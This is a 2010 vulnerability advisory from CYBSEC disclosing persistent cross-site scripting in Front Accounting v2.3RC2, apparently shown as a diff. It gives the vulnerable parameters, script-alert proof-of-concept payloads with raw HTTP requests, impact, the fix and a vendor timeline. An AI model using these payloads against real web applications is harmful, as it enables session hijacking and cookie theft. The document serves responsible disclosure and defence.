@@ -1,0 +1,128 @@
+Advisory Name: Multiple Persistent Cross-Site Scripting (XSS) in Front Accounting
+Internal Cybsec Advisory Id: 2010-1001-Multiple Persistent XSSs in Front Accounting
+
+Vulnerability Class: Permanent Cross-Site Scripting (XSS)
+
+Release Date: 10/29/2010
+
+Affected Applications: Front Accounting v2.3RC2; other versions may also be affected.
+
+Affected Platforms: Any running Front Accounting v2.3RC2
+
+Local / Remote: Remote
+
+Severity: High - CVSS: 5.8 (AV:N/AC:M/Au:NR/C:N/I:P/A:P)
+
+Researcher: Juan Manuel Garcia
+
+Vendor Status: Acknowedged
+
+Reference to Vulnerability Disclosure Policy: http://www.cybsec.com/vulnerability_policy.pdf
+
+Vulnerability Description:
+
+Multiple Persistent Cross-Site vulnerabilities were found in Front Accounting v2.3RC2, because the
+
+application fails to sanitize the response before it is returned to the user. This can be exploited to
+
+execute arbitrary script and HTML code in a user's browser session. This may allow the attacker to
+
+steal the user's cookie and to launch further attacks.
+
+The parameter 'trans_no' in /purchasing/allocations/supplier_allocate.php is not properly sanitized.
+
+The parameter 'PONumber' in /purchasing/po_receive_items.php is not properly sanitized.
+
+Other parameters might also be affected.
+
+Proof of Concept:
+
+* The parameter 'trans_no' in the POST request has been set to:
+
+<script>alert(165602)</script>
+
+GET /purchasing/allocations/supplier_allocate.php?trans_type=1 HTTP/1.0
+
+Cookie: FA4649d6f070639b67129c222b2094650d=2aa6f7cc954528a151a5f5d6c658f418
+
+Accept: */*
+
+Accept-Language: en-US
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+
+Host: next.frontaccounting.eu
+
+Referer: http://next.frontaccounting.eu/purchasing/allocations/supplier_allocation_main.php
+
+* The parameter 'PONumber' in the POST request has been set to:
+
+<script>alert(188214)</script>
+
+GET /purchasing/po_receive_items.php?PONumber= HTTP/1.0
+
+Cookie: FA4649d6f070639b67129c222b2094650d=2aa6f7cc954528a151a5f5d6c658f418
+
+Accept: */*
+
+Accept-Language: en-US
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+
+Host: next.frontaccounting.eu
+
+Referer: http://next.frontaccounting.eu/purchasing/inquiry/po_search.php
+
+Impact:
+
+An affected user may unintentionally execute scripts or actions written by an attacker. In addition, an
+
+attacker may obtain authorization cookies that would allow him to gain unauthorized access to the
+
+application.
+
+Solution:
+
+Upgrade to FrontAccounting v2.3RC3
+
+Vendor Response:
+
+2010-10-12 - Vulnerability was identified
+
+2010-10-13 - Vendor contacted
+
+10/16/2010 Vendor confirmed vulnerability
+
+10/19/2010 Vendor says that the bug will we fixed in FrontAccounting v2.3RC3
+
+10/29/2010 Vulnerability was released
+
+Contact Information:
+
+For more information regarding the vulnerability feel free to contact the researcher at
+
+jmgarcia <at> cybsec <dot> com
+
+About CYBSEC S.A. Security Systems
+
+Since 1996, CYBSEC is engaged exclusively in rendering professional services specialized in
+
+Information Security. Their area of services covers Latin America, Spain and over 250 customers are a
+
+proof of their professional life.
+
+To keep objectivity, CYBSEC S.A. does not represent, neither sell, nor is associated with other
+
+software and/or hardware provider companies.
+
+Our services are strictly focused on Information Security, protecting our clients from emerging security
+
+threats, maintaining their IT deployments available, safe, and reliable.
+
+Beyond professional services, CYBSEC is continuously researching new defense and attack techniques
+
+and contributing with the security community with high quality information exchange.
+
+For more information, please visit www.cybsec.com
+
+(c) 2010 - CYBSEC S.A. Security Systems
